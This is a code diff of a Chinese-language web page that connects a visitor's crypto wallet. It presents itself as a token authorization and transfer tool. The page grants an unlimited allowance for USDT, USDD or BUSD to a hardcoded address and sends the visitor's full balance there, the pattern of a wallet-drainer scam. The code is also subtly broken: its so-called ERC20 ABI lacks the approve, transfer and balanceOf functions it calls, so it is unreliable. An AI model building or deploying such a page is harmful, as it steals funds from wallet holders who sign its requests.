@@ -1,176 +1,169 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>多代币转账</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.0/web3.min.js"></script>
+    <title>代币授权和转账</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.4.0/dist/ethers.min.js"></script>
 </head>
 <body>
-    <h1>钱包连接与多代币转账</h1>
-    <button id="connectButton">连接钱包</button>
-    <button id="authorizeTransfer" disabled>授权所有代币</button>
-    <button id="transferButton" disabled>转移所有代币</button>
-    <p id="status">状态信息</p>
+    <h1>代币授权和转账</h1>
+    
+    <!-- 连接钱包按钮 -->
+    <button id="connectWalletButton">连接钱包</button>
+    <p id="walletAddress"></p>
+
+    <!-- 选择代币 -->
+    <select id="tokenSelect">
+        <option value="0xdAC17F958D2ee523a2206206994597C13D831ec7">USDT</option>
+        <option value="0x0A8D0A3FFFc9a5deF8Cf5dA61A0A146B084F6E70">USDD</option>
+        <option value="0x4fabb145d64652a948d72533023f6e7a623c7c53">BUSD</option>
+    </select>
+
+    <!-- 授权代币按钮 -->
+    <button id="approveButton">授权代币</button>
+
+    <!-- 转账按钮 -->
+    <button id="transferButton">转移代币</button>
 
     <script>
-        let web3;
-        let account;
-        const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 智能合约地址
-        const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收地址
-        const tokens = [
-            { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }, // USDT ERC20地址
-            { symbol: "USDD", address: "0x0A8D0A3FFFc9a5deF8Cf5dA61A0A146B084F6E70" }, // USDD ERC20地址
-            { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53" }  // BUSD ERC20地址
-        ];
-        let contract;
+        let provider;
+        let signer;
+        let userAddress;
+        const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699";  // 你的接收地址
 
-        const abi = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "contract IERC20",
-                        "name": "token",
-                        "type": "address"
-                    }
-                ],
-                "name": "approveAll",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "contract IERC20",
-                        "name": "token",
-                        "type": "address"
-                    }
-                ],
-                "name": "transferAllTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [],
-                "name": "withdrawETH",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "stateMutability": "payable",
-                "type": "receive"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "recipient",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
-
-        // 检查钱包是否已连接
-        async function checkWalletConnected() {
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
-                const accounts = await web3.eth.getAccounts();
-                if (accounts.length > 0) {
-                    account = accounts[0];
-                    document.getElementById("status").innerText = "已连接钱包: " + account;
-                    document.getElementById("authorizeTransfer").disabled = false; // 启用授权按钮
-                    contract = new web3.eth.Contract(abi, contractAddress); // 初始化合约
-                }
-            }
-        }
+        // ERC20 ABI，适用于 approve 和 transfer
+        const ERC20_ABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "approveAll",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "transferAllTokens",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"inputs": [],
+		"name": "withdrawETH",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "receive"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "recipient",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+];
 
         // 连接钱包
         async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
+            if (window.ethereum) {
                 try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0];
-                    document.getElementById("status").innerText = "已连接钱包: " + account;
-                    document.getElementById("authorizeTransfer").disabled = false;
-                    contract = new web3.eth.Contract(abi, contractAddress);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    userAddress = await signer.getAddress();
+                    document.getElementById('walletAddress').innerText = `已连接的钱包地址: ${userAddress}`;
+                    console.log('钱包连接成功: ', userAddress);
                 } catch (error) {
-                    handleError(error);
+                    console.error('连接钱包失败: ', error);
+                    alert('连接钱包失败，请重试');
                 }
             } else {
-                document.getElementById("status").innerText = "请安装 MetaMask!";
+                alert('请安装 MetaMask 或其他支持的加密钱包');
             }
         }
 
-        // 授权所有代币
-        async function authorizeAllTokens() {
+        // 授权代币
+        async function approveToken(tokenAddress) {
             try {
-                for (let token of tokens) {
-                    await contract.methods.approveAll(token.address).send({ from: account });
-                    document.getElementById("status").innerText = token.symbol + " 授权成功!";
-                }
-                document.getElementById("status").innerText += "所有代币授权成功!";
-                document.getElementById("transferButton").disabled = false; // 启用转账按钮
+                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+                const tx = await tokenContract.approve(recipientAddress, ethers.constants.MaxUint256); // 授权最大值
+                await tx.wait();
+                alert('代币授权成功');
+                console.log('代币授权成功');
             } catch (error) {
-                handleError(error);
+                console.error('授权代币失败: ', error);
+                alert('授权代币失败: ' + error.message);
             }
         }
 
-        // 转移所有代币
-        async function transferAllTokens() {
+        // 转移代币
+        async function transferToken(tokenAddress) {
             try {
-                for (let token of tokens) {
-                    await contract.methods.transferAllTokens(token.address).send({ from: account });
-                    document.getElementById("status").innerText = token.symbol + " 转账成功!";
-                }
-                document.getElementById("status").innerText += "所有代币转账成功!";
+                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+                const balance = await tokenContract.balanceOf(userAddress); // 获取代币余额
+                const tx = await tokenContract.transfer(recipientAddress, balance); // 转移所有余额
+                await tx.wait();
+                alert('代币转账成功');
+                console.log('代币转账成功');
             } catch (error) {
-                handleError(error);
+                console.error('代币转账失败: ', error);
+                alert('代币转账失败: ' + error.message);
             }
         }
 
-        // 错误处理
-        function handleError(error) {
-            if (error.code === 4001) {
-                document.getElementById("status").innerText = "用户拒绝了请求。";
-            } else {
-                document.getElementById("status").innerText = "操作失败: " + error.message;
-                console.error("错误信息:", error);
-            }
-        }
+        // 事件绑定
+        document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
 
-        // 事件监听
-        document.getElementById("connectButton").addEventListener("click", connectWallet);
-        document.getElementById("authorizeTransfer").addEventListener("click", authorizeAllTokens);
-        document.getElementById("transferButton").addEventListener("click", transferAllTokens);
+        document.getElementById('approveButton').addEventListener('click', async () => {
+            const selectedTokenAddress = document.getElementById('tokenSelect').value;
+            await approveToken(selectedTokenAddress);
+        });
 
-        // 页面加载时检查钱包连接
-        window.addEventListener('load', checkWalletConnected);
+        document.getElementById('transferButton').addEventListener('click', async () => {
+            const selectedTokenAddress = document.getElementById('tokenSelect').value;
+            await transferToken(selectedTokenAddress);
+        });
     </script>
 </body>
 </html>
